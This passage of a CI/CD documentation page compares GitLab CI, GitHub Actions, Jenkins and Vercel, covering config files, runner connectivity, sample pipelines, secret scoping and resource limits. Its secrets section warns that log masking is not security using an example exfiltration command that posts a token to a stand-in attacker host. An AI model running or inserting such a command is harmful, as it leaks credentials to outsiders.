+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Analytics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/visualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Data Visualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/big_data/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Big Data
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../data/basics/posts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Posts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ai/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AI
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    AI
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Fundamentals
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/basics/concepts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Concepts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/basics/skills_map/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The AI Engineering Skills Map
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/basics/landscape/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The LLM Landscape
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/basics/posts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Posts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tool/Tip
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Tool/Tip
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/tool_tip/tools/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tools
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/tool_tip/spec_driven_development/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Spec-Driven Development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/tool_tip/claude_code/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Claude Code
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ai/tool_tip/codex/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Codex
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#0-cicd-is-three-things" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        0. "CI/CD" Is Three Things
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-what-makes-a-repo-have-cicd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. What Makes a Repo "Have CI/CD"
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-how-the-platform-reaches-your-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. How the Platform Reaches Your Code
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-minimum-working-config" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Minimum Working Config
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-environment-variables-and-secrets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Environment Variables and Secrets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-resource-control-cpu-ram-disk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Resource Control: CPU, RAM, Disk
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Resource Control: CPU, RAM, Disk">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#github-actions-fixed-tiers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GitHub Actions — fixed tiers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gitlab-you-configure-the-runner" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GitLab — you configure the runner
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jenkins-executors-and-agents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Jenkins — executors and agents
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vercel-pick-a-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vercel — pick a machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#disk-and-inodes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Disk and inodes
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-how-the-deploy-actually-happens" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. How the Deploy Actually Happens
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-best-practices" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Best Practices
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        References
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="cicd-platforms">CI/CD Platforms<a class="headerlink" href="#cicd-platforms" title="Permanent link">&para;</a></h1>
+<p>How a repository becomes a pipeline: which file to add, how the platform reaches your code, where secrets live, and what resources your jobs actually get. Covers <strong>GitLab CI</strong>, <strong>GitHub Actions</strong>, <strong>Jenkins</strong>, and <strong>Vercel</strong>.</p>
+<hr />
+<h2 id="0-cicd-is-three-things">0. "CI/CD" Is Three Things<a class="headerlink" href="#0-cicd-is-three-things" title="Permanent link">&para;</a></h2>
+<p>The abbreviation hides an ambiguity: <strong>CI</strong> means one thing, <strong>CD</strong> means two, and the difference between the two CDs is a business decision, not a technical one.</p>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Stands for</th>
+<th>The question it answers</th>
+<th>Ends with</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>CI</strong></td>
+<td>Continuous <strong>Integration</strong></td>
+<td><em>Does this change break anything?</em></td>
+<td>A verified build + test result on every push</td>
+</tr>
+<tr>
+<td><strong>CD</strong></td>
+<td>Continuous <strong>Delivery</strong></td>
+<td><em>Could we release right now if we chose to?</em></td>
+<td>An artifact ready to deploy — a human presses the button</td>
+</tr>
+<tr>
+<td><strong>CD</strong></td>
+<td>Continuous <strong>Deployment</strong></td>
+<td><em>Why would a human press the button?</em></td>
+<td>Every green commit is live in production, automatically</td>
+</tr>
+</tbody>
+</table>
+<pre class="mermaid"><code>flowchart LR
+    P[git push] --&gt; L[Lint]
+    L --&gt; T[Test]
+    T --&gt; B[Build artifact]
+    B --&gt; S[Deploy to staging]
+    S --&gt; G{Manual gate?}
+    G --&gt;|Yes: Continuous Delivery| M[Human approves]
+    G --&gt;|No: Continuous Deployment| PR[Production]
+    M --&gt; PR</code></pre>
+<p>Everything left of "Build artifact" is <strong>CI</strong>. Everything right of it is <strong>CD</strong>. The only difference between Delivery and Deployment is whether that gate exists.</p>
+<p>Practical reading:</p>
+<ul>
+<li><strong>CI is non-negotiable</strong> and the cheapest thing on this page. If you do nothing else, run your tests on every push.</li>
+<li><strong>Continuous Delivery is the sane default</strong> for most teams. You are always <em>able</em> to ship; you decide <em>when</em>.</li>
+<li><strong>Continuous Deployment requires earning it</strong> — strong test coverage, feature flags, fast rollback, and real monitoring. Without those it is just an automated way to break production.</li>
+</ul>
+<p>Vercel is Continuous Deployment out of the box: push to the production branch and it is live. GitLab, GitHub, and Jenkins give you the gate and let you choose.</p>
+<p>For where this sits in the wider delivery process, see <a href="../../basics/lifecycle/#cicd">Lifecycle → CI/CD</a>. The rest of this page is mechanics.</p>
+<hr />
+<h2 id="1-what-makes-a-repo-have-cicd">1. What Makes a Repo "Have CI/CD"<a class="headerlink" href="#1-what-makes-a-repo-have-cicd" title="Permanent link">&para;</a></h2>
+<p>One file, in a path the platform looks for. That is the entire on-ramp.</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>File you add</th>
+<th>Location</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GitLab CI</strong></td>
+<td><code>.gitlab-ci.yml</code></td>
+<td>Repo root</td>
+</tr>
+<tr>
+<td><strong>GitHub Actions</strong></td>
+<td><code>ci.yml</code> (any name)</td>
+<td><code>.github/workflows/</code></td>
+</tr>
+<tr>
+<td><strong>Jenkins</strong></td>
+<td><code>Jenkinsfile</code></td>
+<td>Repo root</td>
+</tr>
+<tr>
+<td><strong>Vercel</strong></td>
+<td><em>nothing required</em></td>
+<td><code>vercel.json</code> at root, optional</td>
+</tr>
+</tbody>
+</table>
+<p>GitLab, GitHub, and Jenkins read that file and do what it says. <strong>Vercel is different</strong>: it inspects your <code>package.json</code> and directory layout, detects the framework, and applies a preset install/build command. You only add <code>vercel.json</code> to <em>override</em> routing, headers, or build settings.</p>
+<p>The file is a contract: <em>on this event, run these steps, in this environment</em>. Everything else is the platform's job.</p>
+<hr />
+<h2 id="2-how-the-platform-reaches-your-code">2. How the Platform Reaches Your Code<a class="headerlink" href="#2-how-the-platform-reaches-your-code" title="Permanent link">&para;</a></h2>
+<p>The pipeline is the same everywhere:</p>
+<pre class="mermaid"><code>flowchart LR
+    D[git push] --&gt; F[Forge: GitLab / GitHub]
+    F --&gt; Q[Job queue]
+    Q --&gt; R[Runner / agent]
+    R --&gt; C[Clone repo, read config]
+    C --&gt; E[Execute steps]
+    E --&gt; S[Report status back to commit or PR]</code></pre>
+<p>What differs is <strong>which direction the connection opens</strong> — and that decides your firewall, not your YAML.</p>
+<pre class="mermaid"><code>flowchart TB
+    subgraph Outbound
+      RN[Runner on your network] --&gt;|long-poll, outbound only| GC[GitLab / GitHub coordinator]
+    end
+    subgraph Inbound
+      GH[Forge webhook] --&gt;|HTTP POST, inbound| JK[Jenkins must be reachable]
+    end</code></pre>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Connection</th>
+<th>Runs the job</th>
+<th>Needs an inbound port?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GitLab CI</strong></td>
+<td>Runner registers with a token, then <strong>long-polls</strong> the coordinator</td>
+<td>GitLab-hosted or self-hosted runners</td>
+<td><strong>No</strong></td>
+</tr>
+<tr>
+<td><strong>GitHub Actions</strong></td>
+<td>Same model — runner polls out</td>
+<td>GitHub-hosted or self-hosted runners</td>
+<td><strong>No</strong></td>
+</tr>
+<tr>
+<td><strong>Jenkins</strong></td>
+<td>Forge sends a <strong>webhook</strong> to your Jenkins URL</td>
+<td>Jenkins controller + agents</td>
+<td><strong>Yes</strong> (or fall back to SCM polling)</td>
+</tr>
+<tr>
+<td><strong>Vercel</strong></td>
+<td>You install the Vercel <strong>Git App</strong> (OAuth) on the org; the forge webhooks Vercel</td>
+<td>Vercel's build machines</td>
+<td>No (Vercel is the public endpoint)</td>
+</tr>
+</tbody>
+</table>
+<p>This is the practical difference people trip over. <strong>GitLab and GitHub runners work from behind NAT with no ports open</strong> — they dial out. <strong>Jenkins is a server</strong>: the forge must be able to reach it, which means a public URL, a tunnel, or SCM polling (which is slower and wasteful). That single fact drives most of the "why is Jenkins harder to host" experience.</p>
+<p>Vercel's model is a third thing: you are not running CI, you are granting a SaaS read access to your repo and letting it build. Push to any branch → <strong>preview deployment</strong>; merge to the production branch → <strong>production deployment</strong>.</p>
+<hr />
+<h2 id="3-minimum-working-config">3. Minimum Working Config<a class="headerlink" href="#3-minimum-working-config" title="Permanent link">&para;</a></h2>
+<div class="tabbed-set" data-tabs="1:4"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio" /><label for="__tabbed_1_1">GitLab</label><div class="tabbed-content">
+<div class="highlight"><pre><span></span><code><span class="c1"># .gitlab-ci.yml</span>
+<span class="nt">stages</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">test</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">build</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">deploy</span><span class="p p-Indicator">]</span>
+
+<span class="nt">test</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>
+<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">python:3.12</span>
+<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pip install -r requirements.txt</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pytest</span>
+
+<span class="nt">build</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">stage</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">build</span>
+<span class="w">  </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker:27</span>
+<span class="w">  </span><span class="nt">services</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">docker</span><span class="p p-Indicator">:</span><span class="nv">27-dind</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="nt">script</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA</span>
+<span class="w">  </span><span class="nt">rules</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">if</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">$CI_COMMIT_BRANCH == &quot;main&quot;</span>
+</code></pre></div>
+</div>
+<input id="__tabbed_1_2" name="__tabbed_1" type="radio" /><label for="__tabbed_1_2">GitHub</label><div class="tabbed-content">
+<div class="highlight"><pre><span></span><code><span class="c1"># .github/workflows/ci.yml</span>
+<span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CI</span>
+<span class="nt">on</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">push</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">main</span><span class="p p-Indicator">]</span>
+<span class="w">  </span><span class="nt">pull_request</span><span class="p">:</span>
+
+<span class="nt">jobs</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">test</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
+<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/setup-python@v5</span>
+<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
+<span class="w">          </span><span class="nt">python-version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3.12&#39;</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pip install -r requirements.txt</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pytest</span>
+</code></pre></div>
+</div>
+<input id="__tabbed_1_3" name="__tabbed_1" type="radio" /><label for="__tabbed_1_3">Jenkins</label><div class="tabbed-content">
+<div class="highlight"><pre><span></span><code><span class="c1">// Jenkinsfile</span>
+<span class="n">pipeline</span><span class="w"> </span><span class="o">{</span>
+<span class="w">  </span><span class="n">agent</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="n">image</span><span class="w"> </span><span class="s1">&#39;python:3.12&#39;</span><span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="o">}</span>
+<span class="w">  </span><span class="n">options</span><span class="w"> </span><span class="o">{</span><span class="w"> </span><span class="n">timeout</span><span class="o">(</span><span class="nl">time:</span><span class="w"> </span><span class="mi">20</span><span class="o">,</span><span class="w"> </span><span class="nl">unit:</span><span class="w"> </span><span class="s1">&#39;MINUTES&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">}</span>
+<span class="w">  </span><span class="n">stages</span><span class="w"> </span><span class="o">{</span>
+<span class="w">    </span><span class="n">stage</span><span class="o">(</span><span class="s1">&#39;Test&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
+<span class="w">      </span><span class="n">steps</span><span class="w"> </span><span class="o">{</span>
+<span class="w">        </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;pip install -r requirements.txt&#39;</span>
+<span class="w">        </span><span class="n">sh</span><span class="w"> </span><span class="s1">&#39;pytest&#39;</span>
+<span class="w">      </span><span class="o">}</span>
+<span class="w">    </span><span class="o">}</span>
+<span class="w">  </span><span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div>
+</div>
+<input id="__tabbed_1_4" name="__tabbed_1" type="radio" /><label for="__tabbed_1_4">Vercel</label><div class="tabbed-content">
+<div class="highlight"><pre><span></span><code><span class="c1">// vercel.json - only if you need to override the detected defaults</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;buildCommand&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;npm run build&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;outputDirectory&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;dist&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;framework&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;vite&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+</div>
+</div>
+<p><code>services: [docker:27-dind]</code> in the GitLab example is how you get a Docker daemon inside a job — the "Docker-in-Docker" pattern that trips up most first pipelines. GitHub's hosted runners already have a daemon, so <code>docker build</code> just works.</p>
+<hr />
+<h2 id="4-environment-variables-and-secrets">4. Environment Variables and Secrets<a class="headerlink" href="#4-environment-variables-and-secrets" title="Permanent link">&para;</a></h2>
+<p>Every platform separates <strong>non-secret config</strong> from <strong>secrets</strong>. Use both.</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Where you set it</th>
+<th>Scoping</th>
+<th>Masking</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GitLab</strong></td>
+<td>Settings → CI/CD → Variables, or <code>variables:</code> in YAML</td>
+<td>Per project/group, <strong>protected</strong> (protected branches only), <strong>masked</strong></td>
+<td>Masked variables hidden in logs</td>
+</tr>
+<tr>
+<td><strong>GitHub</strong></td>
+<td>Settings → Secrets and variables (<code>secrets.*</code> and <code>vars.*</code>)</td>
+<td>Repo, org, or <strong>environment</strong> (with required reviewers)</td>
+<td><code>secrets.*</code> auto-redacted in logs</td>
+</tr>
+<tr>
+<td><strong>Jenkins</strong></td>
+<td>Credentials plugin, then <code>withCredentials</code> or <code>environment {}</code></td>
+<td>Global, folder, or per-job</td>
+<td>Masked when bound as credentials</td>
+</tr>
+<tr>
+<td><strong>Vercel</strong></td>
+<td>Project → Settings → Environment Variables</td>
+<td>Per environment: Production / Preview / Development</td>
+<td>Mark as <strong>Sensitive</strong> to make write-only</td>
+</tr>
+</tbody>
+</table>
+<p>Rules that matter:</p>
+<ul>
+<li><strong>Never put a secret in the YAML file.</strong> It is in git history forever. Reference it: <code>$MY_TOKEN</code>, <code>${{ secrets.MY_TOKEN }}</code>.</li>
+<li><strong>Prefer OIDC over long-lived cloud keys.</strong> GitLab, GitHub, and Jenkins can all exchange a short-lived signed token for AWS/GCP/Azure credentials. No static keys to leak or rotate.</li>
+<li><strong>Scope secrets to protected branches / environments.</strong> A production deploy key available to every feature branch is a production deploy key available to anyone who can open a branch.</li>
+<li><strong>Fork pull requests are hostile input.</strong> Secrets are withheld from fork PRs by default on GitHub — do not defeat that with <code>pull_request_target</code> unless you know exactly what you are doing. Vercel requires explicit authorization to deploy a fork PR for the same reason.</li>
+<li><strong>Masking is not security.</strong> It hides the literal string in logs; it does not stop <code>curl attacker.com -d "$TOKEN"</code>.</li>
+</ul>
+<hr />
+<h2 id="5-resource-control-cpu-ram-disk">5. Resource Control: CPU, RAM, Disk<a class="headerlink" href="#5-resource-control-cpu-ram-disk" title="Permanent link">&para;</a></h2>
+<p>What your job actually gets, and where you change it.</p>
+<h3 id="github-actions-fixed-tiers">GitHub Actions — fixed tiers<a class="headerlink" href="#github-actions-fixed-tiers" title="Permanent link">&para;</a></h3>
+<p>Hosted runner specs, <strong>as of August 2026</strong> (<a href="https://docs.github.com/en/actions/reference/runners/github-hosted-runners">reference</a>):</p>
+<table>
+<thead>
+<tr>
+<th>Label</th>
+<th>Repo type</th>
+<th style="text-align: center;">CPU</th>
+<th style="text-align: center;">RAM</th>
+<th style="text-align: center;">SSD</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ubuntu-latest</code></td>
+<td><strong>Public</strong></td>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">16 GB</td>
+<td style="text-align: center;">14 GB</td>
+</tr>
+<tr>
+<td><code>ubuntu-latest</code></td>
+<td><strong>Private</strong></td>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">8 GB</td>
+<td style="text-align: center;">14 GB</td>
+</tr>
+<tr>
+<td><code>ubuntu-slim</code></td>
+<td>Either</td>
+<td style="text-align: center;">1</td>
+<td style="text-align: center;">5 GB</td>
+<td style="text-align: center;">14 GB</td>
+</tr>
+</tbody>
+</table>
+<p>Public repos get double the machine, free and unlimited. <code>ubuntu-slim</code> is cheap but has a <strong>15-minute job timeout</strong>. You cannot tune these — you pick a label, or use larger runners (paid), or self-host.</p>
+<h3 id="gitlab-you-configure-the-runner">GitLab — you configure the runner<a class="headerlink" href="#gitlab-you-configure-the-runner" title="Permanent link">&para;</a></h3>
+<p>Self-hosted runners take hard limits in <code>config.toml</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="n">concurrent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="w">                     </span><span class="c1"># total jobs across all runners</span>
+
+<span class="k">[[runners]]</span>
+<span class="w">  </span><span class="n">request_concurrency</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="k">[runners.docker]</span>
+<span class="w">    </span><span class="n">memory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;4g&quot;</span>
+<span class="w">    </span><span class="n">memory_swap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;4g&quot;</span>
+<span class="w">    </span><span class="n">memory_reservation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;2g&quot;</span>
+<span class="w">    </span><span class="n">cpus</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;2&quot;</span>
+</code></pre></div>
+<p>On the Kubernetes executor, set requests and limits per job instead:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">variables</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">KUBERNETES_CPU_REQUEST</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;1&quot;</span>
+<span class="w">  </span><span class="nt">KUBERNETES_CPU_LIMIT</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;2&quot;</span>
+<span class="w">  </span><span class="nt">KUBERNETES_MEMORY_REQUEST</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;2Gi&quot;</span>
+<span class="w">  </span><span class="nt">KUBERNETES_MEMORY_LIMIT</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;4Gi&quot;</span>
+</code></pre></div>
+<h3 id="jenkins-executors-and-agents">Jenkins — executors and agents<a class="headerlink" href="#jenkins-executors-and-agents" title="Permanent link">&para;</a></h3>
